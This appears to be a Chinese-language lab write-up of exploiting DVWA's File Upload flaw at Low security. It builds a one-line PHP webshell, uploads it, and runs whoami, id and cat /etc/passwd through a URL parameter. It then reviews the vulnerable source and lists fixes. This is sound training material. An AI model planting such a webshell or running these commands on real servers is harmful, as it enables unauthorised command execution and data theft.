# DVWA 文件上传（Low）30 字节拿到命令执行

> 靶场：DVWA / File Upload，安全等级 Low
> 环境：同 02 篇（Kali + PHP 内置服务器 + Burp）
> 日期：2026-10-21
> 性质：本地授权靶场

---

## 一、目标

上传一个 PHP 文件，通过 URL 参数执行系统命令，理解「上传 → 解析 → 命令执行」这条链。

## 二、过程

### 2.1 造一个 webshell

```bash
printf '%s' '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
ls -l /tmp/shell.php
```

文件只有 30 字节左右。

### 2.2 上传

DVWA 左侧 **File Upload** → **Browse…** → 文件对话框按 `Ctrl + L` 输入 `/tmp/shell.php` → Upload。

页面提示：

```
../../hackable/uploads/shell.php succesfully uploaded!
```

### 2.3 访问并执行

```
http://dvwa.test:8080/hackable/uploads/shell.php?cmd=whoami
```

返回：

```
root.
```

再验证身份：

```
http://dvwa.test:8080/hackable/uploads/shell.php?cmd=id
```

返回：

```
uid=0(root) gid=0(root) groups=0(root)
```

读文件：

```
http://dvwa.test:8080/hackable/uploads/shell.php?cmd=cat%20/etc/passwd
```

**整个 `/etc/passwd` 被完整输出。**

### 2.4 为什么是 root

本地测试环境用 `sudo php -S ...` 启动服务器，PHP 以内置服务器继承了 root 身份，所以上传的脚本也以 root 执行。

**这是反面教材**：真实环境 Web 服务必须用专用低权限用户（如 `www-data`）运行。

## 三、看源码

`vulnerabilities/upload/source/low.php`：

```php
if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        echo '<pre>Your image was not uploaded.</pre>';
    } else {
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}
```

**没有类型检查、没有后缀白名单、没有重命名**，传什么存什么，而且存进了 Web 可访问目录。

## 四、危害

| 后果 | 说明 |
|---|---|
| 命令执行 | 服务器上的任意命令都能跑 |
| 数据泄露 | 读配置、数据库、源码 |
| 权限维持 | 上传后门，长期控制 |
| 进一步提权 | 结合内核漏洞等 |

## 五、修复

| 措施 | 说明 |
|---|---|
| **白名单后缀** | 只允许 jpg/png/gif 等，不用黑名单 |
| **重命名** | 随机文件名 + 正确扩展名，不保留原名 |
| **存到 Web 目录外** | 上传目录禁止解析脚本 |
| **校验文件内容** | `getimagesize`、MIME、文件头 |
| **限制大小与数量** | 防止磁盘打满 |
| **低权限运行** | Web 服务不用 root |

## 六、踩坑

1. **printf 引号要小心**：外层用单引号，避免 `$_GET` 被 shell 展开成空串。
2. **GTK 文件对话框**：直接打字会进入**搜索**，要按 `Ctrl + L` 调出地址栏才能输完整路径。
3. **确认上传后文件真的存在**：`ls -l /tmp/shell.php` 看一眼大小。

## 七、收获

- 上传漏洞的杀伤力在于 **「可写 + 可解析」**：文件能传上去，且 Web 服务器把它当代码执行。
- 修复的核心是 **白名单 + 重命名 + 目录隔离**，三者缺一不可。
- 环境细节也有安全含义：**Web 服务以 root 运行，等于把服务器交出去**。
